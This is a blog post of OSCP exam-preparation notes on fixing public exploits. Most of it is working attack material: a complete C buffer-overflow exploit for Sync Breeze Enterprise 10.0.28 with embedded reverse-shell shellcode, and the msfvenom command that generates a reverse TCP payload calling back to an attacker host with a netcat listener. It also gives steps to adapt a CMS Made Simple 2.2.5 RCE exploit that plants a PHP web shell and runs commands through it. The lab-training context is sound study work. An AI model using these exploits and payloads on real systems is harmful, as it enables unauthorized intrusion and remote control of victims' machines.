---
title: Fixing Exploits
date: 2024-02-24 06:30:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Fixing Exploits tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Fixing Exploits

Adjusting memory corruption and web app exploits require us to modify the socket option and application-specific paramaters, like URIs, cookies, etc.

## Fixing Memory Corruption Exploits

Memory corruption exploits like buffer overflows are a little more complicated and can be difficult to modify for our needs.

### Buffer Overflow Review

A buffer is an area in memory meant to store content that is often user-sent for processing later. Some buffers are dynamic in size and some are fixed/preallocated.

Buffer overflows occur when user-provided content writes beyond the stack limit and into the adjacent area of memory.

Memory corruption vulns occur in different parts of a program, like the stack (stores local functions' data and is fixed in size) or the heap (stores globally-accessible data and is dynamic in size).

The stack will often have local vars like buffers or integers.

```c
*buffer[16]*
...
strcpy(buffer, argv[1]);
```

The argument in the code above is only allocated 16 characters, but performs no checks before copying the user's input.

The return address is a memory address that stores the next function to be executed once the one running has completed. If the user's input is larger than the buffer, it could overwrite that return address. After the function ends, the ret instruction is executed, loading the return address inside the EIP/IRP, which is the instruction pointer responsible for keeping track of active code instructions... This means we may be able to take control of the program flow!

While we can test with arbitrary characters, attackers will typically rewrite the return address with a valid, mapped memory address that has the attacker's shellcode.

We typically want to overwrite the return address wit ha JMP ESP instruction to jump to the stack and run shellcode that we inject immediately following the beginning of our payload.

A stack-based overflow usually looks like this:
- create the large buffer to trigger the overflow
- overwrite a return address on the stack to take control of EIP
- include your payload in the buffer prepended by an optional NOP sled
- choose a valid return address instruction, like JPM ESP (or a different register) to redirect the execution flow to the payload.

One of the most reliable ways to find the return address ourselves is to clone the target environment locally in a VM and use a debugger on the vulnerable software to obtain the memory address of the return address instruction.

Be sure to exclude bad characters in your payload, meaning some ASCII or UNICODE chars break apps when we use them in payloads becayse they might be interpreted as conrol characters. \x00 is often a string terminator, for example, and could truncate our attack buffer.

### Importing and Examining the Exploit

Example:

```console
$ searchsploit "Sync Breeze Enterprise 10.0.28"

Sync Breeze Enterprise 10.0.28 - Denial of-Service (PoC) | windows/dos/43200.py
Sync Breeze Enterprise 10.0.28 - Remote Buffer Over | exploits/windows/remote/42928.py
Sync Breeze Enterprise 10.0.28 - Remote Buffer Over | exploits/windows/dos/42341.c
```

The last exploit listed above is coded in C. In summary:

```
offset    = "A" * 780 
JMP_ESP   =  "\x83\x0c\x09\x10"
shellcode = "\x90"*16 + msf_shellcode
exploit   = offset + JMP_ESP + shellcode
```

At offset 780, overwrite the instruction pointer with a JMP ESP located at memory addr 0x10090c83, append shellcode with 16 NOPs, and include the exploit buffer in the HTTP POST request.

The main differences between python and c that will impact us regard memory management and string operations. Scripting languages are executed through an interpreter, not compiled into a stand-alone exe. Because of this, we cannot run Python on a target where Python is not installed.

TIP: Perhaps consider using PyInstaller, which packages Python apps into stand-alone exes for various target OSs. It is usually best, though, to port the code by hand.

Python also makes it easier to concatenate a string:

```console
$ python
...
>>> string1 = "This is"
>>> string2 = " a test"
>>> string3 = string1 + string2

>>> print(string3)
This is a test
```

However, that is not allowed in a language like C, because there are more precautions required.

Copy the explout and inspect. In this case, we see headers showing us that the code was meant to be compiled on Windows. We could attempt to compile this on Windows, but we'll cross-compile on using Kali.

```console
$ searchsploit -m 42341

$ nano 42341
#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
```

In cases where we need to leverage exploits coded for a certain platform but only have a single attack environment (like Kali) we can use cross-compilers. A popular one is mingw-w64, which we can use to compile code into a Windows Portable Executable (PE) file.

```console
$ sudo apt install mingw-w64

// first, check for compilation errors
$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe

// google search the erros and determine what you need to do
$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

$ ls -lah
42341.c syncbreeze_exploit.exe

$ wine syncbreeze_exploit.exe
```

The -l option instructs mingw-w64 to search for the ws2_32 DLL and include it in the final exe with static linking. In this exploit, the IP and port are hardcoded, so ensure the values are adjusted before compiling.

### Fixing the Exploit

Inspecting the C code further reveals that there is a return address used which is located in the Visual Basic 6.0 runtime msvbvm60.dll, which is not a part of the vulnerable software.To verify, start the sync breeze service on the Win10 host. 

```console
$ rdesktop 111.111.111.111 -u offsec -p lab -g 80%-150-100
```

In Windows Search, search "Services". Find the SyncBreeze service, right click, and Start.

Launch Immunity Debugger as admin, click File > Attach, and select the syncbrs process. Once attached, click on View menu > Executable modules. Verify that msvbvm60.dll is not present (check the Name and Path values).

The python version of the exploit is EDB verified, so we should replace the target return address with the one in that version.

```python
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
```

If we do not have a return address from a pre-made exploit, there's a few options. Firstly, try to recreate the target environment locally and use a debugger to determine this address.

If that doesn't work, try to use info from other public exploits to find a reliable return addr that will match your target. Ex: If you need a return addr for a JMP ESP instruction on Windows Server 2019, search for it in public exploits that target different vulns in the same OS.

In a vanilla buffer overflow, do not rely on hard-coded JMP ESP addrs coming from system DLLs, since they are all randomized at time off boot (ASLR). Try to instead find the instructions in non-ASLR modules inside the target/vulnerable application where possible.

Also, try to find the return address directly from the target machine. If you have an unprivileged user account and are attempting privilege escalation, copy DLLs that we are interested in into our attack machine. Then, use tools like disassemblers (like objdump).

Back to the C code. The shellcode var holds our payload. Bad chars are already listed in the Python exploit, we can generate our own payload with msfvenom. Target the x86 platform and format it for C code.

```console
$ msfvenom -p windows/shell_reverse_tcp LHOST=222.222.222.222 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

PASTE this payload into the shellcode field of our public exploit AFTER the NOP slide.

Our exploit code should now be:

```c
/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.212.10");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {

    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 192.168.212.10\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://172.16.116.222/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 780;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83

    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xbd\xd2\xf5\x12\xec"
    "\xb1\x52\x83\xea\xfc\x31\x6a\x13\x03\xb8\xe6\xf0\x19\xc0"
    "\xe1\x77\xe1\x38\xf2\x17\x6b\xdd\xc3\x17\x0f\x96\x74\xa8"
    "\x5b\xfa\x78\x43\x09\xee\x0b\x21\x86\x01\xbb\x8c\xf0\x2c"
    "\x3c\xbc\xc1\x2f\xbe\xbf\x15\x8f\xff\x0f\x68\xce\x38\x6d"
    "\x81\x82\x91\xf9\x34\x32\x95\xb4\x84\xb9\xe5\x59\x8d\x5e"
    "\xbd\x58\xbc\xf1\xb5\x02\x1e\xf0\x1a\x3f\x17\xea\x7f\x7a"
    "\xe1\x81\xb4\xf0\xf0\x43\x85\xf9\x5f\xaa\x29\x08\xa1\xeb"
    "\x8e\xf3\xd4\x05\xed\x8e\xee\xd2\x8f\x54\x7a\xc0\x28\x1e"
    "\xdc\x2c\xc8\xf3\xbb\xa7\xc6\xb8\xc8\xef\xca\x3f\x1c\x84"
    "\xf7\xb4\xa3\x4a\x7e\x8e\x87\x4e\xda\x54\xa9\xd7\x86\x3b"
    "\xd6\x07\x69\xe3\x72\x4c\x84\xf0\x0e\x0f\xc1\x35\x23\xaf"
    "\x11\x52\x34\xdc\x23\xfd\xee\x4a\x08\x76\x29\x8d\x6f\xad"
    "\x8d\x01\x8e\x4e\xee\x08\x55\x1a\xbe\x22\x7c\x23\x55\xb2"
    "\x81\xf6\xfa\xe2\x2d\xa9\xba\x52\x8e\x19\x53\xb8\x01\x45"
    "\x43\xc3\xcb\xee\xee\x3e\x9c\xd0\x47\x6d\xb1\xb9\x95\x6d"
    "\x48\x81\x13\x8b\x20\xe5\x75\x04\xdd\x9c\xdf\xde\x7c\x60"
    "\xca\x9b\xbf\xea\xf9\x5c\x71\x1b\x77\x4e\xe6\xeb\xc2\x2c"
    "\xa1\xf4\xf8\x58\x2d\x66\x67\x98\x38\x9b\x30\xcf\x6d\x6d"
    "\x49\x85\x83\xd4\xe3\xbb\x59\x80\xcc\x7f\x86\x71\xd2\x7e"
    "\x4b\xcd\xf0\x90\x95\xce\xbc\xc4\x49\x99\x6a\xb2\x2f\x73"
    "\xdd\x6c\xe6\x28\xb7\xf8\x7f\x03\x08\x7e\x80\x4e\xfe\x9e"
    "\x31\x27\x47\xa1\xfe\xaf\x4f\xda\xe2\x4f\xaf\x31\xa7\x70"
    "\x52\x93\xd2\x18\xcb\x76\x5f\x45\xec\xad\x9c\x70\x6f\x47"
    "\x5d\x87\x6f\x22\x58\xc3\x37\xdf\x10\x5c\xd2\xdf\x87\x5d"
    "\xf7";


    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}

```

Recompile.
```console
$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
$ ls -lah
```

Return to Immunity Debugger with Sync Breeze attached and hit Ctrl G. Follow the JMP ESP addr at 0x10090c83 and hit F2 to set a breakpoint. Press F9 to allow the app to run normally.

Run exploit.

```console
$ sudo wine syncbreeze_exploit.exe

[>] Initialising Winsock...
[>] Initialised.
[>] Socket created.
[>] Connected

[>] Request sent

```

In this case, we can see in Immunity that we did not hit our breakpoint, and the app crashes with the EIP register being overwritten by "0x9010090C". Analyzing this next to our buffer, we see that our offset to overwrite the return addr is off by one byte. This causes the CPU to POP a different return addr instead of our intended 0x10090c83.

### Changing the Overflow Buffer

Our code only concatenates a string of 779 "A"s, so ket's increase our requested memory size by one.

```c
    int initial_buffer_size = 781;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
```

Recompile, setup a nc listener on 443, and exploit.

```console
$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

$ sudo nc -lvp 443

$ wine syncbreeze_exploit.exe
```

Watch for your reverse shell!

## Fixing Web Exploits

Web app vulns don't often result in memory corruption, and are easier to re-purpose. Make sure to ask yourself the following questions when researching a web exploit:

- HTTP or HTTPS?
- Specific web app path?
- Pre-authentication or exploiting authentication?
- How are GET or POST requests crafted to trigger the vulnerability? Is any HTTP method involved?
- Does it rely on default settings of the web app that may have been changed by devs after install?
- Will self-signed certs or other outliers impact the exploit's success?

Don't forget you may run into .htaccess files or WAFs.

### Selecting the Vulnerability and Fixing the Code

Imagine we found a Linux host with an apache2 server that has CMS Made Simple v2.2.5 installed and running on TCP 443. This version happens to be vulnerable to remote code execution and an [exploit is on ExploitDB](https://www.exploit-db.com/exploits/44976).

SSH to the host and start the apache2 service.

```console
$ ssh -p22 -lroot 111.111.111.111

$ cd ../../../../var/www/https

$ systemctl start apache2
```

You can now navigate to the site in your browser.

This vuln is post-authentication, but assume we already found valid credentials. Let's adapt the public exploit to this server.

In the exploit code, the base_ulr is hardcoded. Let's change it.

```
base_url = "http://192.168.1.10/cmsms/admin"

TO

base_url = "https://192.168.207.45/admin"
```

While browsing the site, we can see we are presented with an SEC_ERROR_UNKNOW_USER error, which means the cert on the remote host can't be validated, and we'll need to account for this in our exploit code.

The code uses the Python requests lib to communicate with the target, and makes three POST requests:

```python
...
    response  = requests.post(url, data=data, allow_redirects=False)
...
    response = requests.post(url, data=data, files=txt, cookies=cookies)
...
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
...
```

The SSL cert will be ignored if we set the verify param to "False".

```python
...
    response  = requests.post(url, data=data, allow_redirects=False, verify=False)
...
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
...
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
...
```

Lastly, change the creds!

```python
username = "admin"
password = "password"

TO

username = "admin"
password = "HUYfaw763"
```

We don't need to update the payload here because it only execute system commands and they are passed in cleartext. Let's exploit.

```console
$ python2 44976.py
...
File "44976_modified.py", line 24, in parse_csrf_token
    return location.split(csrf_param + "=")[1]
IndexError: list index out of range
```

We have an exception during parse_csrf_token, indicating the code tried to access a non-existent element of a Python list. Add a print statement to troubleshoot.

``console
...
[+] String that is being split: https://192.168.207.45/admin?_sk_=9f6061955f4a39a1335
...
```

Our csrf_param is looking to split at "__c". We can simply change our csrf_param to "_sk_".

```
```python
csrf_param = "_sk_"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"
```

Exploit!

```console
$ python2 44976.py
...
[+] Exploit succeeded, shell can be found at: https://192.168.207.45/uploads/shell.php

$ curl -k https://192.168.207.45/uploads/shell.php?cmd=whoami
www-data
```
